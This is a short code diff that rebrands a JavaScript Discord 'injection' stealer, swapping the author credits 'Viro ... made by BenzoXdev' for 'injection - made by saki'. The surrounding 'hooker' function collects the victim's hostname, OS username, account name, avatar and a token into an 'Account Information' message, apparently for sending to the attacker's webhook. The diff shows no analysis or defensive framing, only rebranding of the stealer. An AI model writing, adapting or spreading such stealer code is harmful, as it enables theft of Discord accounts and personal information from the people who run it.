@@ -147,7 +147,7 @@ const request = async (method, url, headers, data) => {
 
 const hooker = async (content, token, account) => {
     content["content"] = "`" + os.hostname() + "` - `" + os.userInfo().username + "`\n\n" + content["content"];
-    content["username"] = "Viro - cord injection";
+    content["username"] = "injection - by saki";
     content["avatar_url"] = "https://i.ibb.co/yc89txQQ/Viro.png";
     content["embeds"][0]["author"] = {
         "name": account.username,
@@ -156,8 +156,8 @@ const hooker = async (content, token, account) => {
         "url": `https://cdn.discordapp.com/avatars/${account.id}/${account.avatar}.webp`
     };
     content["embeds"][0]["footer"] = {
-        "text": "Viro discord injection - made by BenzoXdev",
-        "icon_url": "https://avatars.githubusercontent.com/u/210432555?s=400&u=34330c3f5ce30c15197ac99efbe1d10f3b711278&v=4",
+        "text": "injection - made by saki",
+        "icon_url": "https://i.pinimg.com/736x/2d/3e/5d/2d3e5d9328744959748a9c4d3af012e6.jpg",
     };
     content["embeds"][0]["title"] = "Account Information";
 
